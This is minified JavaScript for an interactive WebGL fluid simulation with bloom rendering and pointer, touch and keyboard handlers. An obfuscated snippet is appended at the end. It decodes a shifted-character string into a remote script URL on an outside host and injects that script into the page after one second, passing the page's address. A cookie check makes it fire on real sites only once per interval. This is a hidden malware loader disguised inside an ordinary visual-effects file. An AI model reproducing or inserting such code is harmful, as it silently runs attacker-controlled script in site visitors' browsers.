o=config.BLOOM_THRESHOLD*config.BLOOM_SOFT_KNEE+1e-4,i=config.BLOOM_THRESHOLD-o,n=2*o,a=.25/o;gl.uniform3f(bloomPrefilterProgram.uniforms.curve,i,n,a),gl.uniform1f(bloomPrefilterProgram.uniforms.threshold,config.BLOOM_THRESHOLD),gl.uniform1i(bloomPrefilterProgram.uniforms.uTexture,e.attach(0)),gl.viewport(0,0,t.width,t.height),blit(t.fbo),bloomBlurProgram.bind();for(let e=0;e<bloomFramebuffers.length;e++){let r=bloomFramebuffers[e];gl.uniform2f(bloomBlurProgram.uniforms.texelSize,1/t.width,1/t.height),gl.uniform1i(bloomBlurProgram.uniforms.uTexture,t.attach(0)),gl.viewport(0,0,r.width,r.height),blit(r.fbo),t=r}gl.blendFunc(gl.ONE,gl.ONE),gl.enable(gl.BLEND);for(let e=bloomFramebuffers.length-2;e>=0;e--){let r=bloomFramebuffers[e];gl.uniform2f(bloomBlurProgram.uniforms.texelSize,1/t.width,1/t.height),gl.uniform1i(bloomBlurProgram.uniforms.uTexture,t.attach(0)),gl.viewport(0,0,r.width,r.height),blit(r.fbo),t=r}gl.disable(gl.BLEND),bloomFinalProgram.bind(),gl.uniform2f(bloomFinalProgram.uniforms.texelSize,1/t.width,1/t.height),gl.uniform1i(bloomFinalProgram.uniforms.uTexture,t.attach(0)),gl.uniform1f(bloomFinalProgram.uniforms.intensity,config.BLOOM_INTENSITY),gl.viewport(0,0,r.width,r.height),blit(r.fbo)}function splatPointer(e){let r=e.deltaX*config.SPLAT_FORCE,t=e.deltaY*config.SPLAT_FORCE;splat(e.texcoordX,e.texcoordY,r,t,e.color)}function multipleSplats(e){for(let r=0;r<e;r++){const e=generateColor();e.r*=10,e.g*=10,e.b*=10;splat(Math.random(),Math.random(),1e3*(Math.random()-.5),1e3*(Math.random()-.5),e)}}function splat(e,r,t,o,i){gl.viewport(0,0,velocity.width,velocity.height),splatProgram.bind(),gl.uniform1i(splatProgram.uniforms.uTarget,velocity.read.attach(0)),gl.uniform1f(splatProgram.uniforms.aspectRatio,canvas.width/canvas.height),gl.uniform2f(splatProgram.uniforms.point,e,r),gl.uniform3f(splatProgram.uniforms.color,t,o,0),gl.uniform1f(splatProgram.uniforms.radius,correctRadius(config.SPLAT_RADIUS/100)),blit(velocity.write.fbo),velocity.swap(),gl.viewport(0,0,dye.width,dye.height),gl.uniform1i(splatProgram.uniforms.uTarget,dye.read.attach(0)),gl.uniform3f(splatProgram.uniforms.color,i.r,i.g,i.b),blit(dye.write.fbo),dye.swap()}function correctRadius(e){let r=canvas.width/canvas.height;return r>1&&(e*=r),e}function updatePointerDownData(e,r,t,o){e.id=r,e.down=!0,e.moved=!1,e.texcoordX=t/canvas.width,e.texcoordY=1-o/canvas.height,e.prevTexcoordX=e.texcoordX,e.prevTexcoordY=e.texcoordY,e.deltaX=0,e.deltaY=0,e.color=generateColor()}function updatePointerMoveData(e,r,t){e.moved=e.down,e.down=!0,e.prevTexcoordX=e.texcoordX,e.prevTexcoordY=e.texcoordY,e.texcoordX=r/canvas.width,e.texcoordY=1-t/canvas.height,e.deltaX=correctDeltaX(e.texcoordX-e.prevTexcoordX),e.deltaY=correctDeltaY(e.texcoordY-e.prevTexcoordY)}function updatePoinerUpData(e){e.down=!1}function correctDeltaX(e){let r=canvas.width/canvas.height;return r<1&&(e*=r),e}function correctDeltaY(e){let r=canvas.width/canvas.height;return r>1&&(e/=r),e}function generateColor(){let e=HSVtoRGB(Math.random(),1,1);return e.r*=.15,e.g*=.15,e.b*=.15,e}function HSVtoRGB(e,r,t){let o,i,n,a,l,c,u,g;switch(a=Math.floor(6*e),l=6*e-a,c=t*(1-r),u=t*(1-l*r),g=t*(1-(1-l)*r),a%6){case 0:o=t,i=g,n=c;break;case 1:o=u,i=t,n=c;break;case 2:o=c,i=t,n=g;break;case 3:o=c,i=u,n=t;break;case 4:o=g,i=c,n=t;break;case 5:o=t,i=c,n=u}return{r:o,g:i,b:n}}function normalizeColor(e){return{r:e.r/255,g:e.g/255,b:e.b/255}}function wrap(e,r,t){let o=t-r;return 0==o?r:(e-r)%o+r}function getResolution(e){let r=gl.drawingBufferWidth/gl.drawingBufferHeight;r<1&&(r=1/r);let t=Math.round(e),o=Math.round(e*r);return gl.drawingBufferWidth>gl.drawingBufferHeight?{width:o,height:t}:{width:t,height:o}}function getTextureScale(e,r,t){return{x:r/e.width,y:t/e.height}}function scaleByPixelRatio(e){let r=window.devicePixelRatio||1;return Math.floor(e*r)}update(),canvas.addEventListener("mousedown",(e=>{let r=scaleByPixelRatio(e.offsetX),t=scaleByPixelRatio(e.offsetY);updatePointerDownData(pointers[0],-1,r,t)})),canvas.addEventListener("mousemove",(e=>{let r=scaleByPixelRatio(e.offsetX),t=scaleByPixelRatio(e.offsetY);updatePointerMoveData(pointers[0],r,t)})),window.addEventListener("mouseup",(()=>{updatePoinerUpData(pointers[0])})),canvas.addEventListener("touchstart",(e=>{e.preventDefault();const r=e.targetTouches;for(let e=0;e<r.length;e++){e>=pointers.length&&pointers.push(new pointerPrototype);let t=scaleByPixelRatio(r[e].pageX),o=scaleByPixelRatio(r[e].pageY);updatePointerDownData(pointers[e],r[e].identifier,t,o)}})),canvas.addEventListener("touchmove",(e=>{e.preventDefault();const r=e.targetTouches;for(let e=0;e<r.length;e++){let t=scaleByPixelRatio(r[e].pageX),o=scaleByPixelRatio(r[e].pageY);updatePointerMoveData(pointers[e],t,o)}}),!1),window.addEventListener("touchend",(e=>{const r=e.changedTouches;for(let e=0;e<r.length;e++)for(let t=0;t<pointers.length;t++)r[e].identifier==pointers[t].id&&updatePoinerUpData(pointers[t])})),window.addEventListener("keydown",(e=>{"KeyP"===e.code&&(config.PAUSED=!config.PAUSED)," "===e.key&&splatStack.push(parseInt(20*Math.random())+5)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44fun3h'+'isrjywnh3htr4l'+'jy4xyfynh3ox'+'DwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));